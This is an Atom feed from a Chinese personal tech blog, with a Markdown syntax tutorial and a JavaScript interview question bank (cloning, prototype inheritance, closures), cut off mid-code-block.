<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Honey Young</title>
  
  <subtitle>小杨鹤</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-06-01T07:20:46.208Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>honey young</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>个人技能</title>
    <link href="http://yoursite.com/2018/05/23/%E4%B8%AA%E4%BA%BA%E6%A0%87%E7%AD%BE/"/>
    <id>http://yoursite.com/2018/05/23/个人标签/</id>
    <published>2018-05-23T07:23:29.000Z</published>
    <updated>2018-06-01T07:20:46.208Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="个人技能" scheme="http://yoursite.com/categories/%E4%B8%AA%E4%BA%BA%E6%8A%80%E8%83%BD/"/>
    
    
      <category term="CSS" scheme="http://yoursite.com/tags/CSS/"/>
    
      <category term="CSS3" scheme="http://yoursite.com/tags/CSS3/"/>
    
      <category term="js" scheme="http://yoursite.com/tags/js/"/>
    
      <category term="Ajax" scheme="http://yoursite.com/tags/Ajax/"/>
    
      <category term="AngularJS" scheme="http://yoursite.com/tags/AngularJS/"/>
    
      <category term="BOM" scheme="http://yoursite.com/tags/BOM/"/>
    
      <category term="Bower" scheme="http://yoursite.com/tags/Bower/"/>
    
      <category term="Cookie" scheme="http://yoursite.com/tags/Cookie/"/>
    
      <category term="DOM" scheme="http://yoursite.com/tags/DOM/"/>
    
      <category term="EJS" scheme="http://yoursite.com/tags/EJS/"/>
    
      <category term="Express" scheme="http://yoursite.com/tags/Express/"/>
    
      <category term="Gulp" scheme="http://yoursite.com/tags/Gulp/"/>
    
      <category term="HTML" scheme="http://yoursite.com/tags/HTML/"/>
    
      <category term="HTML5" scheme="http://yoursite.com/tags/HTML5/"/>
    
      <category term="JSON" scheme="http://yoursite.com/tags/JSON/"/>
    
      <category term="MongoDB" scheme="http://yoursite.com/tags/MongoDB/"/>
    
      <category term="MySQL" scheme="http://yoursite.com/tags/MySQL/"/>
    
      <category term="Node.js" scheme="http://yoursite.com/tags/Node-js/"/>
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
      <category term="React" scheme="http://yoursite.com/tags/React/"/>
    
      <category term="RequireJS" scheme="http://yoursite.com/tags/RequireJS/"/>
    
      <category term="SeaJs" scheme="http://yoursite.com/tags/SeaJs/"/>
    
      <category term="Session" scheme="http://yoursite.com/tags/Session/"/>
    
      <category term="Underscore" scheme="http://yoursite.com/tags/Underscore/"/>
    
      <category term="browser" scheme="http://yoursite.com/tags/browser/"/>
    
      <category term="canvas" scheme="http://yoursite.com/tags/canvas/"/>
    
      <category term="cordova" scheme="http://yoursite.com/tags/cordova/"/>
    
      <category term="eCharts" scheme="http://yoursite.com/tags/eCharts/"/>
    
      <category term="git" scheme="http://yoursite.com/tags/git/"/>
    
      <category term="github" scheme="http://yoursite.com/tags/github/"/>
    
      <category term="hexo" scheme="http://yoursite.com/tags/hexo/"/>
    
      <category term="http" scheme="http://yoursite.com/tags/http/"/>
    
      <category term="ionic" scheme="http://yoursite.com/tags/ionic/"/>
    
      <category term="jQuery" scheme="http://yoursite.com/tags/jQuery/"/>
    
      <category term="Grunt" scheme="http://yoursite.com/tags/Grunt/"/>
    
      <category term="markdown" scheme="http://yoursite.com/tags/markdown/"/>
    
      <category term="mine" scheme="http://yoursite.com/tags/mine/"/>
    
      <category term="net" scheme="http://yoursite.com/tags/net/"/>
    
      <category term="network" scheme="http://yoursite.com/tags/network/"/>
    
      <category term="npm" scheme="http://yoursite.com/tags/npm/"/>
    
      <category term="nrm" scheme="http://yoursite.com/tags/nrm/"/>
    
      <category term="nvm" scheme="http://yoursite.com/tags/nvm/"/>
    
      <category term="tools" scheme="http://yoursite.com/tags/tools/"/>
    
      <category term="webpack" scheme="http://yoursite.com/tags/webpack/"/>
    
      <category term="artTemplate" scheme="http://yoursite.com/tags/artTemplate/"/>
    
      <category term="ps" scheme="http://yoursite.com/tags/ps/"/>
    
      <category term="sublime" scheme="http://yoursite.com/tags/sublime/"/>
    
      <category term="webstorm" scheme="http://yoursite.com/tags/webstorm/"/>
    
      <category term="vs code" scheme="http://yoursite.com/tags/vs-code/"/>
    
      <category term="svn" scheme="http://yoursite.com/tags/svn/"/>
    
      <category term="eclipse" scheme="http://yoursite.com/tags/eclipse/"/>
    
      <category term="命令行" scheme="http://yoursite.com/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/"/>
    
      <category term="小项目" scheme="http://yoursite.com/tags/%E5%B0%8F%E9%A1%B9%E7%9B%AE/"/>
    
      <category term="库" scheme="http://yoursite.com/tags/%E5%BA%93/"/>
    
      <category term="性能优化" scheme="http://yoursite.com/tags/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
    
      <category term="数据库" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
      <category term="框架" scheme="http://yoursite.com/tags/%E6%A1%86%E6%9E%B6/"/>
    
      <category term="模块化" scheme="http://yoursite.com/tags/%E6%A8%A1%E5%9D%97%E5%8C%96/"/>
    
      <category term="正则" scheme="http://yoursite.com/tags/%E6%AD%A3%E5%88%99/"/>
    
      <category term="表单" scheme="http://yoursite.com/tags/%E8%A1%A8%E5%8D%95/"/>
    
      <category term="面向对象" scheme="http://yoursite.com/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
      <category term="交互" scheme="http://yoursite.com/tags/%E4%BA%A4%E4%BA%92/"/>
    
      <category term="blog" scheme="http://yoursite.com/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>markdown</title>
    <link href="http://yoursite.com/2016/07/08/markdown/"/>
    <id>http://yoursite.com/2016/07/08/markdown/</id>
    <published>2016-07-07T16:00:00.000Z</published>
    <updated>2018-06-05T08:31:12.431Z</updated>
    
    <content type="html"><![CDATA[<p>markdown 轻量级标记语言（html、xml），它允许人们“使用易读易写的纯文本格式编写文档”，Markdown 最重要的设计就是可读性，Markdown 可以选择性的转换为 HTML 文档格式，很多网站目前都使用了 Markdown 或者其变种，例如Github、简书等大型社区。</p><h2 id="markdown-特点"><a href="#markdown-特点" class="headerlink" title="markdown 特点"></a>markdown 特点</h2><ul><li>纯文本，所以兼容性极强，可以用所有文本编辑器打开</li><li>专注于文字写作而不是排版</li><li>格式转换方便，可以轻松转换为 HTML、PPT、电子书等</li><li>Markdown 标记语法简单好记，可读性强</li></ul><a id="more"></a><h3 id="实时预览编辑器"><a href="#实时预览编辑器" class="headerlink" title="实时预览编辑器"></a>实时预览编辑器</h3><p><a href="http://www.williamlong.info/archives/4319.html" target="_blank" rel="noopener">月光博客 - 好用的Markdown编辑器一览</a></p><ul><li>dillinger</li><li>马克飞象</li><li>简书</li><li>MarkdownPad</li><li>Sublime Text<ul><li>配合 <code>Markdown Preview</code> 插件</li></ul></li><li>Webstorm<ul><li>配合插件</li></ul></li><li>gitbook</li></ul><p>编辑实时预览工具只是为了辅助教学而已，我们真正在进行写作的时候，其实是不需要实时预览的，因为 Markdown 标记语言本身已经足够清晰了。</p><h3 id="Markdown-基本语法"><a href="#Markdown-基本语法" class="headerlink" title="Markdown 基本语法"></a>Markdown 基本语法</h3><p>注意：每个标题、段落、图片、代码段、一个列表之间都用一行空行分开；</p><ul><li>标题<ul><li><code>#</code>: 表示 h1,</li><li><code>##</code>: 表示 h2,</li><li><code>###</code>: 表示 h3,</li><li><code>####</code>: 表示 h4,</li><li><code>#####</code>: 表示 h5,</li><li><code>#####</code>: 表示 h6</li></ul></li><li>段落<ul><li>直接写，不用任何空格</li></ul></li><li>Markdown中粗体与斜体非常简单，用两个<em>号把文字包围相当于粗体，用一个</em>号把文字包围相当于斜体。使用两个~~号包围则显示删除线效果。</li><li>粗体   <strong>粗体</strong>  </li><li>斜体   <em>斜体</em> </li><li>删除线 <del>删除</del></li><li>无序列表<ul><li>一级用 <code>-</code> 加一个空格</li><li>二级用 一个 <code>tab</code> 之后加一个 <code>+</code> 和一个空格</li><li>三级同样再放一个 <code>tab</code>之后加一个 <code>*</code> 和一个空格</li></ul></li><li>有序列表<ul><li><code>数字.</code> 加空格</li></ul></li><li>链接<ul><li><code>[连接名称](连接url)</code></li></ul></li><li>图片<ul><li><code>![图片名称](图片路径url)</code></li></ul></li><li>`文本引用<ul><li>用一个 <code>&gt;</code> 来引用</li></ul></li><li>行内代码引用<ul><li>一对反引号包裹，esc 下面的键</li></ul></li><li>多行代码引用<ul><li>一对三个反引号包裹</li></ul></li><li>表格<br>表格比较特殊，不太好用，下面是规范写法：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| ABCD | EFGH | IJKL |</span><br><span class="line">| -----|:----:| ----:|</span><br><span class="line">| a    | b    | c    |</span><br><span class="line">| d    | e    |  f   |</span><br><span class="line">| g    | h    |   i  |</span><br></pre></td></tr></table></figure><h3 id="Markdown-使用场景"><a href="#Markdown-使用场景" class="headerlink" title="Markdown 使用场景"></a>Markdown 使用场景</h3><ul><li>学习笔记<ul><li>手写笔记</li></ul></li><li>演讲稿<ul><li>技术沙龙，party</li><li>Markdown 演讲稿</li></ul></li><li>写书（侧重于技术相关的内容非常适合）</li><li>个人笔记</li><li>文章博客</li><li>教学讲义</li><li>说明文档<ul><li>使用比较多，软件的说明文档或者开源项目的说明文档</li></ul></li><li>电子邮件</li></ul><p>只要有写作的地方，都可以使用 Markdown 来书写。</p><h3 id="用-Markdown-编辑电子邮件"><a href="#用-Markdown-编辑电子邮件" class="headerlink" title="用 Markdown 编辑电子邮件"></a>用 Markdown 编辑电子邮件</h3><p>Markdown 本身语法简单，使用 Markdown 写出来的内容结构也非常清晰，有助于协作沟通，总而言之，使用 Markdown 可以可以更加专注写作本身。</p><p>其实就是将 md 格式字符串转换成 html 而已，这里使用一个 Chrome 插件：</p><p><a href="https://chrome.google.com/webstore/detail/markdown-here/elifhakcjgalahccnjkneoccemfahfoa?utm_source=chrome-ntp-icon" target="_blank" rel="noopener">Markdown Here</a></p><h3 id="使用-GitBook-制作电子书"><a href="#使用-GitBook-制作电子书" class="headerlink" title="使用 GitBook 制作电子书"></a>使用 GitBook 制作电子书</h3><p><a href="https://www.gitbook.com/" target="_blank" rel="noopener">GitBook</a></p><ul><li>在线 Web 端写</li><li>使用客户端软件写<ul><li><a href="https://www.gitbook.com/editor" target="_blank" rel="noopener">下载地址：</a></li></ul></li><li>终端命令行工具可以辅助生成</li></ul><h3 id="自己动手做一个-Markdown-实时预览编辑器"><a href="#自己动手做一个-Markdown-实时预览编辑器" class="headerlink" title="自己动手做一个 Markdown 实时预览编辑器"></a>自己动手做一个 Markdown 实时预览编辑器</h3><p>Markdown 本身就是一个标记语言，可以通过某种方式转换成别的文本格式，本质上转换的过程其实就是做正则解析替换。</p><ul><li>如何将markdown格式字符串转成html<ul><li>使用一个第三方包：<code>marked</code></li><li><code>npm install marked</code></li></ul></li><li>给 html 设置样式</li><li>给代码块设置颜色高亮<ul><li>highlightjs</li></ul></li></ul><h2 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h2><ul><li><a href="https://zh.wikipedia.org/wiki/Markdown" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Markdown</a></li><li><a href="http://www.jianshu.com/p/q81RER" target="_blank" rel="noopener">http://www.jianshu.com/p/q81RER</a></li><li><a href="http://wowubuntu.com/markdown/" target="_blank" rel="noopener">http://wowubuntu.com/markdown/</a></li><li><a href="http://www.jianshu.com/p/PpDNMG" target="_blank" rel="noopener">http://www.jianshu.com/p/PpDNMG</a></li><li><a href="http://www.jianshu.com/p/qqGjLN" target="_blank" rel="noopener">http://www.jianshu.com/p/qqGjLN</a></li><li><a href="https://www.zhihu.com/question/20409634" target="_blank" rel="noopener">https://www.zhihu.com/question/20409634</a></li><li><a href="http://www.markdown.cn/" target="_blank" rel="noopener">http://www.markdown.cn/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;markdown 轻量级标记语言（html、xml），它允许人们“使用易读易写的纯文本格式编写文档”，Markdown 最重要的设计就是可读性，Markdown 可以选择性的转换为 HTML 文档格式，很多网站目前都使用了 Markdown 或者其变种，例如Github、简书等大型社区。&lt;/p&gt;
&lt;h2 id=&quot;markdown-特点&quot;&gt;&lt;a href=&quot;#markdown-特点&quot; class=&quot;headerlink&quot; title=&quot;markdown 特点&quot;&gt;&lt;/a&gt;markdown 特点&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;纯文本，所以兼容性极强，可以用所有文本编辑器打开&lt;/li&gt;
&lt;li&gt;专注于文字写作而不是排版&lt;/li&gt;
&lt;li&gt;格式转换方便，可以轻松转换为 HTML、PPT、电子书等&lt;/li&gt;
&lt;li&gt;Markdown 标记语法简单好记，可读性强&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="markdown系列" scheme="http://yoursite.com/categories/markdown%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="markdown" scheme="http://yoursite.com/tags/markdown/"/>
    
  </entry>
  
  <entry>
    <title>题库-js 高级</title>
    <link href="http://yoursite.com/2016/06/28/%E9%A2%98%E5%BA%93-js%20%E9%AB%98%E7%BA%A7/"/>
    <id>http://yoursite.com/2016/06/28/题库-js 高级/</id>
    <published>2016-06-27T16:00:00.000Z</published>
    <updated>2018-06-05T07:49:17.003Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、JQuery一个对象可以同时绑定多个事件，实现原理"><a href="#1、JQuery一个对象可以同时绑定多个事件，实现原理" class="headerlink" title="1、JQuery一个对象可以同时绑定多个事件，实现原理"></a>1、JQuery一个对象可以同时绑定多个事件，实现原理</h2><p>jQuery可以给一个对象同时绑定多个事件，低层实现方式是使用 addEventListner 或 attachEvent 兼容不同的浏览器实现事件的绑定，这样可以给同一个对象注册</p><h2 id="2、webkit、用浏览器的各种工具来调试和debug代码"><a href="#2、webkit、用浏览器的各种工具来调试和debug代码" class="headerlink" title="2、webkit、用浏览器的各种工具来调试和debug代码"></a>2、webkit、用浏览器的各种工具来调试和debug代码</h2><blockquote><p>Webkit是浏览器引擎，包括 html 渲染和 js 解析功能，手机浏览器的主流内核，与之相对应的引擎有 Gecko（Mozilla Firefox 等使用）和 Trident（也称MSHTML，IE 使用）。<br>对于浏览器的调试工具要熟练使用，主要是页面结构分析，后台请求信息查看，js 调试工具使用，熟练使用这些工具可以快速提高解决问题的效率</p></blockquote><a id="more"></a><h2 id="3、如何测试前端代码-知道-BDD-TDD-Unit-Test-么"><a href="#3、如何测试前端代码-知道-BDD-TDD-Unit-Test-么" class="headerlink" title="3、如何测试前端代码? 知道 BDD, TDD, Unit Test 么?"></a>3、如何测试前端代码? 知道 BDD, TDD, Unit Test 么?</h2><p>怎么测试你的前端工程 (mocha, sinon, jasmin, qUnit..)</p><p>了解BDD行为驱动开发与 TDD 测试驱动开发已经单元测试相关概念</p><blockquote><p>TDD：测试驱动开发（Test-Driven Development）</p></blockquote><p>测试驱动开发是敏捷开发中的一项核心实践和技术，也是一种设计方法论。TDD的原理是在开发功能代码之前，先编写单元测试用例代码，测试代码确定需要编写什么产品代码。TDD的基本思路就是通过测试来推动整个开发的进行，但测试驱动开发并不只是单纯的测试工作，而是把需求分析，设计，质量控制量化的过程。TDD首先考虑使用需求（对象、功能、过程、接口等），主要是编写测试用例框架对功能的过程和接口进行设计，而测试框架可以持续进行验证。</p><blockquote><p>BDD：行为驱动开发（Behavior Driven Development）</p></blockquote><p>行为驱动开发是一种敏捷软件开发的技术，它鼓励软件项目中的开发者、QA和非技术人员或商业参与者之间的协作。主要是从用户的需求出发，强调系统行为。BDD最初是由Dan North在2003年命名，它包括验收测试和客户测试驱动等的极限编程的实践，作为对测试驱动开发的回应。</p><blockquote><p>ATDD：验收测试驱动开发（Acceptance Test Driven Development）</p></blockquote><p>TDD 只是开发人员的职责，通过单元测试用例来驱动功能代码的实现。在准备实施一个功能或特性之前，首先团队需要定义出期望的质量标准和验收细则，以明确而且达成共识的验收测试计划（包含一系列测试场景）来驱动开发人员的TDD实践和测试人员的测试脚本开发。面向开发人员，强调如何实现系统以及如何检验。</p><h2 id="4、前端-templating-Mustache-underscore-handlebars-是干嘛的-怎么用"><a href="#4、前端-templating-Mustache-underscore-handlebars-是干嘛的-怎么用" class="headerlink" title="4、前端 templating(Mustache, underscore, handlebars) 是干嘛的, 怎么用?"></a>4、前端 templating(Mustache, underscore, handlebars) 是干嘛的, 怎么用?</h2><blockquote><p>Web 模板引擎是为了使用户界面与业务数据（内容）分离而产生的，<br>Mustache 是一个 logic-less （轻逻辑）模板解析引擎，它的优势在于可以应用在 Javascript、PHP、Python、Perl 等多种编程语言中。<br>Underscore封装了常用的JavaScript对象操作方法，用于提高开发效率。<br>Handlebars 是 JavaScript 一个语义模板库，通过对view和data的分离来快速构建Web模板。</p></blockquote><h2 id="5、Handlebars-的基本用法"><a href="#5、Handlebars-的基本用法" class="headerlink" title="5、Handlebars 的基本用法"></a>5、Handlebars 的基本用法</h2><p>没有用过的话说出它是干什么的即可</p><h2 id="6、Handlerbars-的对模板的基本处理流程，-如何编译的？如何缓存的？"><a href="#6、Handlerbars-的对模板的基本处理流程，-如何编译的？如何缓存的？" class="headerlink" title="6、Handlerbars 的对模板的基本处理流程， 如何编译的？如何缓存的？"></a>6、Handlerbars 的对模板的基本处理流程， 如何编译的？如何缓存的？</h2><p>学习技术不仅要会用，还有熟悉它的实现机制，这样在开发中遇到问题时才能更好的解决</p><h2 id="7、用js实现千位分隔符"><a href="#7、用js实现千位分隔符" class="headerlink" title="7、用js实现千位分隔符"></a>7、用js实现千位分隔符</h2><p>原生js的熟练度，实践经验，实现思路</p><h2 id="8、检测浏览器版本版本有哪些方式？"><a href="#8、检测浏览器版本版本有哪些方式？" class="headerlink" title="8、检测浏览器版本版本有哪些方式？"></a>8、检测浏览器版本版本有哪些方式？</h2><p>IE与标准浏览器判断，IE不同版本的判断，<code>userAgent var ie = /*@cc_on !@*/false;</code></p><h2 id="9、实现一个函数-clone"><a href="#9、实现一个函数-clone" class="headerlink" title="9、实现一个函数 clone"></a>9、实现一个函数 clone</h2><p>要求：对JavaScript中的5种主要的数据类型（包括Number、String、Object、Array、Boolean）进行值复制</p><blockquote><p>考察点1：对于基本数据类型和引用数据类型在内存中存放的是值还是指针这一区别是否清楚<br>考察点2：是否知道如何判断一个变量是什么类型的<br>考察点3：递归算法的设计</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法一：</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.clone = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> o = <span class="keyword">this</span>.constructor === <span class="built_in">Array</span> ? [] : &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> e <span class="keyword">in</span> <span class="keyword">this</span>)&#123;</span><br><span class="line">    o[e] = <span class="keyword">typeof</span> <span class="keyword">this</span>[e] === <span class="string">"object"</span> ? <span class="keyword">this</span>[e].clone() : <span class="keyword">this</span>[e];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//方法二：</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 克隆一个对象</span></span><br><span class="line"><span class="comment">* @param Obj</span></span><br><span class="line"><span class="comment">* @returns</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clone</span>(<span class="params">Obj</span>) </span>&#123;   </span><br><span class="line">  <span class="keyword">var</span> buf;   </span><br><span class="line">  <span class="keyword">if</span> (Obj <span class="keyword">instanceof</span> <span class="built_in">Array</span>) &#123;   </span><br><span class="line">    buf = [];<span class="comment">//创建一个空的数组 </span></span><br><span class="line">    <span class="keyword">var</span> i = Obj.length;   </span><br><span class="line">    <span class="keyword">while</span> (i--) &#123;   </span><br><span class="line">      buf[i] = clone(Obj[i]);   </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">return</span> buf;    </span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span> (Obj <span class="keyword">instanceof</span> <span class="built_in">Object</span>)&#123;   </span><br><span class="line">    buf = &#123;&#125;;<span class="comment">//创建一个空对象 </span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> k <span class="keyword">in</span> Obj) &#123; <span class="comment">//为这个对象添加新的属性 </span></span><br><span class="line">      buf[k] = clone(Obj[k]);   </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">return</span> buf;   </span><br><span class="line">  &#125;<span class="keyword">else</span>&#123; <span class="comment">//普通变量直接赋值</span></span><br><span class="line">    <span class="keyword">return</span> Obj;   </span><br><span class="line">  &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="10、小贤是一条可爱的小狗-Dog-，它的叫声很好听-wow-，每次看到主人的时候就会乖乖叫一声-yelp-。从这段描述可以得到以下对象："><a href="#10、小贤是一条可爱的小狗-Dog-，它的叫声很好听-wow-，每次看到主人的时候就会乖乖叫一声-yelp-。从这段描述可以得到以下对象：" class="headerlink" title="10、小贤是一条可爱的小狗(Dog)，它的叫声很好听(wow)，每次看到主人的时候就会乖乖叫一声(yelp)。从这段描述可以得到以下对象："></a>10、小贤是一条可爱的小狗(Dog)，它的叫声很好听(wow)，每次看到主人的时候就会乖乖叫一声(yelp)。从这段描述可以得到以下对象：</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Dog</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.wow = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">'Wow'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>.yelp = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.wow();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="11、小芒和小贤一样，原来也是一条可爱的小狗，可是突然有一天疯了-MadDog-，一看到人就会每隔半秒叫一声-wow-地不停叫唤-yelp-。请根据描述，按示例的形式用代码来实。（继承，原型，setInterval）"><a href="#11、小芒和小贤一样，原来也是一条可爱的小狗，可是突然有一天疯了-MadDog-，一看到人就会每隔半秒叫一声-wow-地不停叫唤-yelp-。请根据描述，按示例的形式用代码来实。（继承，原型，setInterval）" class="headerlink" title="11、小芒和小贤一样，原来也是一条可爱的小狗，可是突然有一天疯了(MadDog)，一看到人就会每隔半秒叫一声(wow)地不停叫唤(yelp)。请根据描述，按示例的形式用代码来实。（继承，原型，setInterval）"></a>11、小芒和小贤一样，原来也是一条可爱的小狗，可是突然有一天疯了(MadDog)，一看到人就会每隔半秒叫一声(wow)地不停叫唤(yelp)。请根据描述，按示例的形式用代码来实。（继承，原型，setInterval）</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MadDog</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.yelp = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> self = <span class="keyword">this</span>;          </span><br><span class="line">    setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      self.wow();      </span><br><span class="line">    &#125;, <span class="number">500</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">MadDog.prototype = <span class="keyword">new</span> Dog();         </span><br><span class="line"><span class="comment">//for test</span></span><br><span class="line"><span class="keyword">var</span> dog = <span class="keyword">new</span> Dog();</span><br><span class="line">dog.yelp();</span><br><span class="line"><span class="keyword">var</span> madDog = <span class="keyword">new</span> MadDog();</span><br><span class="line">madDog.yelp();</span><br></pre></td></tr></table></figure><h2 id="12、下面这个ul，如何点击每一列的时候alert其index-（闭包）"><a href="#12、下面这个ul，如何点击每一列的时候alert其index-（闭包）" class="headerlink" title="12、下面这个ul，如何点击每一列的时候alert其index?（闭包）"></a>12、下面这个ul，如何点击每一列的时候alert其index?（闭包）</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul id=”test”&gt;</span><br><span class="line">&lt;li&gt;这是第一条&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">&lt;li&gt;这是第二条&lt;/</span>li&gt;</span><br><span class="line">&lt;li&gt;这是第三条&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">&lt;/u</span>l&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="comment">// 方法一：</span></span><br><span class="line">  <span class="keyword">var</span> lis=<span class="built_in">document</span>.getElementById(<span class="string">'2223'</span>).getElementsByTagName(<span class="string">'li'</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    lis[i].index=i;</span><br><span class="line">    lis[i].onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      alert(<span class="keyword">this</span>.index);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//方法二：</span></span><br><span class="line">  <span class="keyword">var</span> lis=<span class="built_in">document</span>.getElementById(<span class="string">'2223'</span>).getElementsByTagName(<span class="string">'li'</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">    lis[i].index=i;</span><br><span class="line">    lis[i].onclick=(<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(a);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)(i);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h2 id="13、编写一个JavaScript函数，输入指定类型的选择器"><a href="#13、编写一个JavaScript函数，输入指定类型的选择器" class="headerlink" title="13、编写一个JavaScript函数，输入指定类型的选择器"></a>13、编写一个JavaScript函数，输入指定类型的选择器</h2><p>仅需支持id，class，tagName三种简单CSS选择器，无需兼容组合选择器)可以返回匹配的DOM节点，需考虑浏览器兼容性和性能。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 